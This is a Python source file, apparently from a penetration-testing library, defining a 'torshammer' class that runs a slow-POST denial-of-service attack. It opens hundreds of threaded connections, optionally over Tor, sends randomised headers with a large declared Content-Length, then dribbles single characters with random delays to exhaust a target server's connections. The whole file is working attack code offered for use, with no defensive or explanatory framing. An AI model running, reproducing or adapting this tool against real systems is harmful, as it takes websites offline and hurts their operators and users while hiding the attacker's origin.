from bane.ddos.utils import *

class torshammer(DDoS_Class):
    def __init__(
        self,
        u,
        p=80,
        cookie=None,
        user_agents=None,
        threads_daemon=True,
        threads=500,
        timeout=5,
        tor=False,
        duration=60,
        logs=False,
        max_content=15000,
        min_content=10000,
        ssl_on=False,
        paths=['/']
    ):
        self.paths=paths
        self.ssl_on=ssl_on
        self.counter = 0
        self.cookie = cookie
        self.user_agents = user_agents
        if not self.user_agents or len(self.user_agents) == 0:
            self.user_agents = Common_Variables.user_agents_list
        self.max_content = max_content
        self.min_content = min_content
        self.stop = False
        self.start = time.time()
        self.target = u
        self.duration = duration
        self.port = p
        self.timeout = timeout
        self.tor = tor
        self.logs = logs
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
            except:
                pass

    def attack(self):
        try:
            time.sleep(1)
            while True:
                if (
                    int(time.time() - self.start) >= self.duration
                ):  # this is a safety mechanism so the attack won't run forever
                    break
                if self.stop == True:
                    break
                try:
                    if self.tor==True:
                        s=get_tor_socket_connection(self.target,self.port,timeout=self.timeout)
                    else:
                        s=get_socket_connection(self.target,self.port,timeout=self.timeout)
                    if self.port==443 or self.ssl_on==True:
                        s=wrap_socket_with_ssl(s,self.target)
                    self.counter += 1
                    if self.logs == True:
                        sys.stdout.write(
                            "\rConnected to {}:{}...".format(self.target, self.port)
                        )
                        sys.stdout.flush()
                        # print("Connected to {}:{}...".format(self.target,self.port))
                    q = random.randint(self.min_content, self.max_content)
                    ck = ""
                    if self.cookie:
                        ck = "Cookie: " + self.cookie + "\r\n"
                    s.send(
                        reorder_headers_randomly(
                            "POST {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(
                                random.choice(self.paths),
                                ck,
                                random.choice(self.user_agents),
                                random.randint(300, 1000),
                                q,
                                (
                                    random.choice(Common_Variables.referers_list)
                                    + random.choice(Common_Variables.source_string)
                                    + str(random.randint(0, 100000000))
                                    + random.choice(Common_Variables.source_string)
                                ),
                                self.target,
                            )
                        ).encode("utf-8")
                    )
                    for i in range(q):
                        if (
                            int(time.time() - self.start) >= self.duration
                        ):  # this is a safety mechanism so the attack won't run forever
                            break
                        if self.stop == True:
                            break
                        h = random.choice(Common_Variables.source_string)
                        try:
                            s.send(h.encode("utf-8"))
                            if self.logs == True:
                                sys.stdout.write("\rPosted: {}".format(h))
                                sys.stdout.flush()
                                # print("Posted: {}".format(h))
                            time.sleep(random.uniform(0.1, 3))
                        except:
                            break
                    s.close()
                except:
                    pass
                self.counter -= 1
                time.sleep(0.1)
                if self.stop == True:
                    break
            self.kill()
        except:
            pass
